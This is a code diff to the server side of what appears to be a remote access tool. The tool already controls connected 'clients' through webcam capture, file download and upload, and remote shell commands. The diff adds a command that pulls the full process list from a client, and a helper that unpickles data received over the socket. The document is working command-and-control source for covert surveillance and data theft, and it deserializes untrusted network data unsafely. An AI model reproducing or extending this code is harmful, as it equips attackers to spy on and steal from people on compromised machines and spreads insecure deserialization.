@@ -13,6 +13,9 @@ from pathlib import Path
 from time import sleep, time
 from rich.progress import BarColumn, Progress, TimeRemainingColumn
 from rich import print as printr
+from rich.console import Console
+from rich.table import Table
+from rich.box import SIMPLE
 from os import system, uname
 
 class Server(object):
@@ -25,7 +28,45 @@ class Server(object):
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
-    
+
+    # getting all processes running in client side
+    def getProcessList(self, args):
+        if self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = self.receiveHeader(connection)
+                processInfo = self.receiveProcessList(connection, header)
+                table = Table(show_footer=False, title=f"List of all processes running.", box=SIMPLE) # creating table to show data from received processes
+                for column in ['PID', 'User', 'Process Name', 'Executable', 'Command']: # adding the columns
+                    table.add_column(column)
+
+                for process in processInfo: # adding the rows
+                    table.add_row(process['pid'], process['user'], process['name'], process['exe'], process['cwd'])
+                
+                console = Console() # creating the Cosole object
+                console.print(table, f"{header['total']} processes running", justify="center") # printing the table
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr(f'Info: Shows basic information of all process running on the client side')
+
+    def receiveProcessList(self, connection, header):
+        progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
+
+        with progress:
+            task = progress.add_task(f"Receiving process list", total=header['bytes'])
+
+            processList = received = b''
+
+            while len(processList) < header['bytes']:
+                received = connection.recv(header['bytes'])
+                processList += received
+                progress.update(task, advance=len(received))
+        
+        return loads(processList)
+
     # getting the current user who you are attached
     def getCurrentUser(self):
         return self.connectedUsers[self.userAttached]
@@ -85,6 +126,9 @@ class Server(object):
     def sendHeader(self, connection, header):
         connection.send(dumps(header))
 
+    def receiveHeader(self, connection):
+        return loads(connection.recv(512))
+
     # return name of file, your extension and bytes content
     def splitFile(self, path):
         with open(path, 'rb') as file:
@@ -124,7 +168,7 @@ class Server(object):
                     sleep(1)
                     connection.send(file)
 
-                    response = loads(connection.recv(512))
+                    response = self.receiveHeader(connection)
                     if response['sucess']:
                         printr(f"[green]{response['content']}")
                     else:
@@ -145,7 +189,7 @@ class Server(object):
             connection = self.getCurrentUser()['conn']
             connection.send(self.lastCommand.encode())
             try:
-                header = loads(connection.recv(512))
+                header = self.receiveHeader(connection)
                 if header["sucess"]:
                     self.receiveFile(connection, header)
                 else:
@@ -166,7 +210,7 @@ class Server(object):
                 connection = self.getCurrentUser()['conn']
                 connection.send(self.lastCommand.encode())
                 
-                header = loads(connection.recv(512))
+                header = self.receiveHeader(connection)
                 if args:
                     if header['sucess']:
                         self.receiveFile(connection, header)
@@ -193,7 +237,7 @@ class Server(object):
             connection = self.getCurrentUser()['conn']
             connection.send(self.lastCommand.encode())
             try:
-                header = loads(connection.recv(512))
+                header = self.receiveHeader(connection)
                 self.receiveFile(connection, header)
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
@@ -283,6 +327,7 @@ class Server(object):
             "/webcamshot": {"local": False, "action": self.webcamshot},
             "/download": {"local": False, "action": self.download},
             "/upload": {"local": False, "action": self.upload},
+            "/getprocesslist": {"local": False, "action": self.getProcessList},
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
@@ -330,7 +375,7 @@ class Server(object):
             connection = self.getCurrentUser()['conn'] # getting the socket object from the current user
             connection.send(command.encode())
             try:
-                header = loads(connection.recv(512)) # receiving header of the command
+                header = self.receiveHeader(connection) # receiving header of the command
                 self.userCwd = header['currentDirectory'] # updating the current directory you are
                 self.receiveCommand(connection, header)
             except EOFError:
